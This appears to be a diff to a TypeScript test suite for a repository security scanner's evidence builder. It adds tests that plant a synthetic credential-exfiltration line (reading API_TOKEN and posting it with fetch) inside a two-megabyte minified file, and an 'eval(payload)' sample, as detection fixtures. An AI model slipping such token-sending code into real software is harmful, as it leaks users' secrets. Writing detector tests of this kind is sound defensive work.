@@ -228,16 +228,134 @@ describe("evidence context builder", () => {
       },
     });
     const initial = groups[0]!;
-    const expanded = expandEvidenceContextGroup(initial, source, 1);
+    const expanded = expandEvidenceContextGroup(initial, 1);
 
     expect(expanded.group_id).toBe(initial.group_id);
     expect(expanded.candidates).toEqual(initial.candidates);
     expect(expanded.context.source.length).toBeGreaterThan(
       initial.context.source.length,
     );
-    expect(() =>
-      expandEvidenceContextGroup(initial, `${source}tampered`, 1),
-    ).toThrow(/changed/iu);
+  });
+
+  test("bounds a multi-megabyte one-line derived finding by characters", async () => {
+    const root = await mkdtemp(join(tmpdir(), "tavernkeeper-one-line-"));
+    roots.push(root);
+    const signal = "const t=process.env.API_TOKEN;fetch(endpoint,{body:t})";
+    const source = `${"a".repeat(1_000_000)}${signal}${"b".repeat(1_000_000)}`;
+    await writeFile(join(root, "app.min.js"), source);
+    const finding = normalizeFinding({
+      origin: "javascript-analysis",
+      ruleId: "javascript.credential-to-network",
+      category: "credential-theft",
+      severity: "high",
+      confidence: "medium",
+      path: "app.min.js",
+      lineStart: 1,
+      lineEnd: 1,
+      evidenceSha: null,
+      title: "Credential and network behavior",
+      explanation: "Credential access is correlated with a network sink.",
+    });
+    const sha256 = createHash("sha256").update(source).digest("hex");
+
+    const groups = await buildEvidenceContextGroups({
+      checkoutRoot: root,
+      target: {
+        source_id: "github-45",
+        provider: "github",
+        repository_id: 45,
+        repository: "owner/one-line",
+        canonical_url: "https://github.com/owner/one-line",
+        target_sha: "e".repeat(40),
+      },
+      projectKinds: ["extension"],
+      findings: [finding],
+      inventory: {
+        root,
+        files: [
+          {
+            path: "app.min.js",
+            bytes: Buffer.byteLength(source),
+            sha256,
+            kind: "text",
+            likelyMinified: true,
+          },
+        ],
+        totals: { files: 1, bytes: Buffer.byteLength(source) },
+        totalBytes: Buffer.byteLength(source),
+      },
+      javascriptEvidenceHints: [
+        {
+          finding_fingerprint: finding.fingerprint,
+          original_path: finding.path,
+          stage: "raw",
+          representation_sha256: sha256,
+          transform_depth: 0,
+          line_start: 1,
+          line_end: 1,
+          column_start: 1_000_001,
+          column_end: 1_000_001 + signal.length,
+          source,
+        },
+      ],
+      maxEvidenceCharactersPerFinding: 24_000,
+    });
+
+    expect(groups[0]?.context.source.length).toBeLessThanOrEqual(24_000);
+    expect(groups[0]?.context.source).toContain("fetch(endpoint");
+    expect(groups[0]?.context.expansions).not.toEqual([]);
+    expect(groups[0]?.context.representations).toEqual([
+      { stage: "raw", sha256, transform_depth: 0 },
+    ]);
+  });
+
+  test("rejects a JavaScript-analysis finding without bound representation evidence", async () => {
+    const root = await mkdtemp(join(tmpdir(), "tavernkeeper-js-hint-"));
+    roots.push(root);
+    const source = "eval(payload)";
+    await writeFile(join(root, "app.js"), source);
+    const finding = normalizeFinding({
+      origin: "javascript-analysis",
+      ruleId: "javascript.xray.unsafe-stmt",
+      category: "code-execution",
+      severity: "medium",
+      confidence: "medium",
+      path: "app.js",
+      lineStart: 1,
+      lineEnd: 1,
+      evidenceSha: null,
+      title: "Dynamic execution",
+      explanation: "A static analyzer found dynamic execution.",
+    });
+
+    await expect(
+      buildEvidenceContextGroups({
+        checkoutRoot: root,
+        target: {
+          source_id: "github-46",
+          provider: "github",
+          repository_id: 46,
+          repository: "owner/missing-hint",
+          canonical_url: "https://github.com/owner/missing-hint",
+          target_sha: "f".repeat(40),
+        },
+        projectKinds: ["extension"],
+        findings: [finding],
+        inventory: {
+          root,
+          files: [
+            {
+              path: "app.js",
+              bytes: Buffer.byteLength(source),
+              sha256: createHash("sha256").update(source).digest("hex"),
+              kind: "text",
+            },
+          ],
+          totals: { files: 1, bytes: Buffer.byteLength(source) },
+          totalBytes: Buffer.byteLength(source),
+        },
+      }),
+    ).rejects.toThrow(/representation evidence/iu);
   });
 
   test("uses supplied historical source for a history finding", async () => {
